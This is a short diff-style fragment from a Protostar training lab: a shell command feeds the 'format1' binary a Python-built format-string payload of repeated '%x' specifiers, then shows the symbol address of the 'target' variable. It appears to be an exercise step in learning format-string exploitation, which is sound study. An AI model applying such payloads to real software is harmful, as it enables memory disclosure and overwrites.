@@ -1,0 +1,5 @@
+user@protostar:/opt/protostar/bin$ ./format1 "`python -c 'print "AAAACC" + "%x " * 127' + '%x '`"
+
+
+08049638 g     O .bss	00000004              target
+
